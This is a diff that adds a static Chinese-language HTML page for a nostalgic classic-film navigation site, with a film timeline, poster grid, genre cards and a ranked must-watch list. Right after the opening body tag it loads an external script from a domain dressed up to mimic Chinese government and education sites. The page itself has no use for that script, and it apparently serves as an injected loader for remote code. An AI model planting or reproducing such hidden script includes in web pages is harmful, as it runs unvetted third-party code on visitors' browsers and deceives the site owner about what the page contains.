@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>八七电影网 - 80/90年代经典老电影在线导航</title>
+<meta name="description" content="八七电影网（baqidianyingwang-h5）专注80、90年代经典电影、国产老片、香港黄金时代、欧美影史佳作导航与推荐。官方网址：https://baqidianyingwang-h5.github.io">
+<meta name="keywords" content="八七电影网, baqidianyingwang-h5, 经典老电影, 80年代电影, 90年代电影, 香港电影, 国产老片">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Songti SC","SimSun","PingFang SC",serif;
+  background:#15110c;
+  color:#efe3d0;
+  line-height:1.8;
+  overflow-x:hidden;
+}
+
+/* 噪点叠层 */
+body::after{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;opacity:.05;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+}
+
+/* 顶栏 */
+.film-nav{
+  position:sticky;top:0;z-index:1000;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 20px;
+  background:rgba(21,17,12,.9);
+  border-bottom:2px solid #3a2c1c;
+}
+.film-nav .logo{font-size:22px;font-weight:900;letter-spacing:2px;color:#e7b96a}
+.film-nav .logo b{color:#fff}
+.film-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.film-nav .links a{
+  font-size:13px;color:#c9b79a;padding:6px 12px;border:1px solid #3a2c1c;border-radius:4px;transition:.25s;
+}
+.film-nav .links a:hover{background:#3a2c1c;color:#ffe2a8}
+
+/* Hero 放映机 */
+.hero{
+  position:relative;min-height:78vh;display:flex;align-items:center;justify-content:center;text-align:center;padding:80px 20px;
+  background:
+    radial-gradient(circle at 50% 30%, rgba(231,185,106,.18), transparent 55%),
+    repeating-linear-gradient(90deg, rgba(255,255,255,.015) 0 2px, transparent 2px 6px),
+    #15110c;
+}
+.reel{
+  position:absolute;width:160px;height:160px;border-radius:50%;
+  border:10px solid #3a2c1c;top:18%;left:8%;animation:spin 12s linear infinite;
+}
+.reel.r2{left:auto;right:8%;top:auto;bottom:16%;animation-duration:16s;animation-direction:reverse}
+.reel::before{content:"";position:absolute;inset:34px;border-radius:50%;background:#e7b96a;opacity:.25}
+@keyframes spin{to{transform:rotate(360deg)}}
+.hero h1{font-size:52px;font-weight:900;color:#ffe2a8;text-shadow:0 4px 0 #3a2c1c;margin-bottom:14px}
+.hero h1 span{color:#fff}
+.hero p{font-size:16px;color:#c9b79a;max-width:560px;margin:0 auto 18px}
+.hero .url{
+  display:inline-block;margin-top:18px;font-size:13px;color:#15110c;background:#e7b96a;
+  padding:8px 18px;border-radius:20px;letter-spacing:1px;font-weight:700;
+}
+
+/* 通用 */
+.wrap{max-width:1140px;margin:0 auto;padding:70px 20px}
+.kicker{font-size:12px;letter-spacing:5px;color:#a98c63;text-transform:uppercase;margin-bottom:8px}
+.sec-title{font-size:28px;font-weight:900;color:#ffe2a8;margin-bottom:34px}
+
+/* 栏目一：胶卷时间轴 */
+.reel-track{
+  display:flex;gap:18px;overflow-x:auto;padding:14px 4px 26px;scroll-snap-type:x mandatory;
+}
+.reel-track::-webkit-scrollbar{height:8px}
+.reel-track::-webkit-scrollbar-thumb{background:#3a2c1c;border-radius:10px}
+.reel-frame{
+  flex:0 0 240px;scroll-snap-align:start;
+  background:#1d170f;border:1px solid #3a2c1c;border-radius:10px;overflow:hidden;
+}
+.reel-frame .yr{
+  background:#3a2c1c;color:#ffe2a8;font-weight:800;padding:8px 12px;font-size:14px;letter-spacing:2px;
+}
+.reel-frame .body{padding:16px}
+.reel-frame h4{font-size:16px;color:#fff;margin-bottom:6px}
+.reel-frame p{font-size:13px;color:#c9b79a;margin:0}
+
+/* 栏目二：老海报栅格 */
+.poster-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:18px;
+}
+.poster{
+  aspect-ratio:3/4;border-radius:8px;position:relative;overflow:hidden;
+  border:1px solid #3a2c1c;filter:sepia(.35) contrast(1.05);transition:.3s;
+}
+.poster:hover{transform:scale(1.03);filter:sepia(0) contrast(1.1);border-color:#e7b96a}
+.poster .p1{background:linear-gradient(160deg,#5b3a29,#241008)}
+.poster .p2{background:linear-gradient(160deg,#2f4858,#0c1620)}
+.poster .p3{background:linear-gradient(160deg,#6b2737,#1c0a10)}
+.poster .p4{background:linear-gradient(160deg,#4a4326,#161306)}
+.poster .p5{background:linear-gradient(160deg,#33402a,#0c1208)}
+.poster .p6{background:linear-gradient(160deg,#3a2c4a,#100a18)}
+.poster .cap{
+  position:absolute;left:0;right:0;bottom:0;padding:10px 12px;
+  background:linear-gradient(to top,rgba(0,0,0,.85),transparent);
+}
+.poster .cap b{display:block;color:#ffe2a8;font-size:14px}
+.poster .cap span{font-size:11px;color:#c9b79a}
+
+/* 栏目三：年代筛选条 */
+.decade-bar{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:28px}
+.decade-bar span{
+  font-size:13px;padding:7px 16px;border:1px solid #3a2c1c;border-radius:30px;color:#c9b79a;cursor:pointer;transition:.2s;
+}
+.decade-bar span:hover,.decade-bar span.on{background:#e7b96a;color:#15110c;font-weight:700;border-color:#e7b96a}
+.genre-list{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.genre{
+  background:#1d170f;border:1px solid #3a2c1c;border-left:4px solid #e7b96a;border-radius:8px;padding:18px;
+}
+.genre h4{color:#fff;font-size:16px;margin-bottom:6px}
+.genre p{color:#c9b79a;font-size:13px;margin:0}
+
+/* 栏目四：怀旧片单 */
+.classic-list{display:flex;flex-direction:column;gap:14px}
+.classic{
+  display:flex;align-items:center;gap:16px;background:#1d170f;border:1px solid #3a2c1c;border-radius:10px;padding:14px 18px;flex-wrap:wrap;
+}
+.classic .no{font-size:22px;font-weight:900;color:#e7b96a;flex:0 0 42px;text-align:center}
+.classic .meta{flex:1;min-width:200px}
+.classic .meta h4{font-size:16px;color:#fff;margin-bottom:2px}
+.classic .meta p{font-size:13px;color:#a98c63;margin:0}
+.classic .rate{font-size:15px;font-weight:800;color:#ffd27a}
+
+/* 关于 */
+.about{
+  background:linear-gradient(135deg,rgba(231,185,106,.08),rgba(58,44,28,.2));
+  border:1px solid #3a2c1c;border-radius:16px;padding:36px;
+}
+.about h2{color:#ffe2a8;font-size:22px;margin-bottom:12px}
+.about p{color:#c9b79a;font-size:14px;margin-bottom:10px}
+.about .stats{display:flex;gap:30px;flex-wrap:wrap;margin-top:20px}
+.about .stats .n{font-size:30px;font-weight:900;color:#e7b96a}
+.about .stats .l{font-size:12px;color:#a98c63}
+
+/* 页脚 */
+.foot{text-align:center;padding:36px 20px;background:#0e0b07;color:#7c6849;font-size:13px;border-top:2px solid #3a2c1c}
+.foot a{color:#e7b96a}
+.foot .lg{font-size:18px;font-weight:900;color:#efe3d0;margin-bottom:8px}
+
+@media(max-width:640px){
+  .hero h1{font-size:34px}
+  .reel{display:none}
+  .film-nav .links a{font-size:12px;padding:5px 9px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="film-nav">
+  <div class="logo">八七<b>电影网</b></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#reel">胶片年代</a>
+    <a href="#posters">老海报</a>
+    <a href="#genre">类型片</a>
+    <a href="#classic">必看片单</a>
+    <a href="#about">关于</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="reel"></div>
+  <div class="reel r2"></div>
+  <h1>八七电影网 · <span>黄金年代</span></h1>
+  <p>80、90 年代国产老片、香港黄金时代、欧美影史经典——像在老放映机里重新转动一次。</p>
+  <span class="url">🌐 https://baqidianyingwang-h5.github.io</span>
+</header>
+
+<section id="reel" class="wrap">
+  <div class="kicker">FILM REEL · 1980—1999</div>
+  <h2 class="sec-title">胶卷里的年代</h2>
+  <div class="reel-track">
+    <div class="reel-frame"><div class="yr">1982</div><div class="body"><h4>城南旧事</h4><p>胡同、驼铃、童年记忆，散文诗般的中国电影。</p></div></div>
+    <div class="reel-frame"><div class="yr">1987</div><div class="body"><h4>红高粱</h4><p>张艺谋成名作，黄土、高粱酒与生命野性。</p></div></div>
+    <div class="reel-frame"><div class="yr">1990</div><div class="body"><h4>阿飞正传</h4><p>王家卫的香港迷雾，无脚鸟的起点。</p></div></div>
+    <div class="reel-frame"><div class="yr">1993</div><div class="body"><h4>霸王别姬</h4><p>京剧、时代与痴绝，华语影史巅峰之一。</p></div></div>
+    <div class="reel-frame"><div class="yr">1994</div><div class="body"><h4>活着</h4><p>余华式命运，一个家庭与半个世纪中国。</p></div></div>
+    <div class="reel-frame"><div class="yr">1995</div><div class="body"><h4>大话西游</h4><p>无厘头外壳下，一生一世的爱情寓言。</p></div></div>
+    <div class="reel-frame"><div class="yr">1994</div><div class="body"><h4>肖申克的救赎</h4><p>希望是好事，也许是最好的事。</p></div></div>
+  </div>
+</section>
+
+<section id="posters" class="wrap">
+  <div class="kicker">POSTER ARCHIVE</div>
+  <h2 class="sec-title">老海报陈列室</h2>
+  <div class="poster-grid">
+    <div class="poster p1"><div class="cap"><b>黄土地</b><span>1984 · 国产</span></div></div>
+    <div class="poster p2"><div class="cap"><b>花样年华</b><span>2000 · 香港</span></div></div>
+    <div class="poster p3"><div class="cap"><b>胭脂扣</b><span>1987 · 香港</span></div></div>
+    <div class="poster p4"><div class="cap"><b>阳光灿烂的日子</b><span>1994 · 国产</span></div></div>
+    <div class="poster p5"><div class="cap"><b>秋菊打官司</b><span>1992 · 国产</span></div></div>
+    <div class="poster p6"><div class="cap"><b>东邪西毒</b><span>1994 · 香港</span></div></div>
+  </div>
+</section>
+
+<section id="genre" class="wrap">
+  <div class="kicker">GENRES</div>
+  <h2 class="sec-title">类型片陈列</h2>
+  <div class="decade-bar">
+    <span class="on">全部</span><span>1980s</span><span>1990s</span><span>国产老片</span><span>香港电影</span><span>欧美经典</span><span>文艺片</span><span>警匪片</span><span>喜剧片</span>
+  </div>
+  <div class="genre-list">
+    <div class="genre"><h4>国产文艺</h4><p>时代变迁、乡土记忆、知识分子命运。</p></div>
+    <div class="genre"><h4>香港警匪</h4><p>枪火、兄弟情、江湖规矩与城市夜色。</p></div>
+    <div class="genre"><h4>无厘头喜剧</h4><p>周星驰式荒诞，笑完才发现是悲剧。</p></div>
+    <div class="genre"><h4>欧洲文艺</h4><p>长镜头、沉默、时间与关系的细碎。</p></div>
+    <div class="genre"><h4>好莱坞老片</h4><p>黑色电影、西部片、古典叙事的黄金期。</p></div>
+    <div class="genre"><h4>动画经典</h4><p>手绘、水墨、定格，慢工出光影。</p></div>
+  </div>
+</section>
+
+<section id="classic" class="wrap">
+  <div class="kicker">MUST-WATCH</div>
+  <h2 class="sec-title">八七必看片单</h2>
+  <div class="classic-list">
+    <div class="classic"><div class="no">01</div><div class="meta"><h4>霸王别姬</h4><p>陈凯歌 · 1993 · 国产/文艺</p></div><div class="rate">9.6</div></div>
+    <div class="classic"><div class="no">02</div><div class="meta"><h4>肖申克的救赎</h4><p>弗兰克·德拉邦特 · 1994 · 欧美</p></div><div class="rate">9.7</div></div>
+    <div class="classic"><div class="no">03</div><div class="meta"><h4>大话西游</h4><p>刘镇伟 · 1995 · 香港</p></div><div class="rate">9.2</div></div>
+    <div class="classic"><div class="no">04</div><div class="meta"><h4>活着</h4><p>张艺谋 · 1994 · 国产</p></div><div class="rate">9.3</div></div>
+    <div class="classic"><div class="no">05</div><div class="meta"><h4>花样年华</h4><p>王家卫 · 2000 · 香港</p></div><div class="rate">8.7</div></div>
+    <div class="classic"><div class="no">06</div><div class="meta"><h4>红高粱</h4><p>张艺谋 · 1987 · 国产</p></div><div class="rate">8.4</div></div>
+  </div>
+</section>
+
+<section id="about" class="wrap">
+  <div class="about">
+    <h2>关于八七电影网</h2>
+    <p>八七电影网（baqidianyingwang-h5）是一个以“怀旧观影”为调性的电影导航站。我们不做信息流轰炸，只把 80、90 年代那些值得重看的片子，按年代、海报、类型、片单重新摆进橱窗。</p>
+    <p>页面为静态单页，移动端自适应，内链使用锚点，适合 GitHub Pages 托管与搜索引擎收录。</p>
+    <div class="stats">
+      <div><div class="n">1980s</div><div class="l">起点年代</div></div>
+      <div><div class="n">300+</div><div class="l">老片资料</div></div>
+      <div><div class="n">6</div><div class="l">类型陈列</div></div>
+      <div><div class="n">∞</div><div class="l">怀旧指数</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="lg">🎞️ 八七电影网</div>
+  官方网址：<a href="https://baqidianyingwang-h5.github.io">https://baqidianyingwang-h5.github.io</a><br>
+  © 2026 八七电影网｜胶卷重启，老片不死
+</footer>
+
+</body>
+</html>
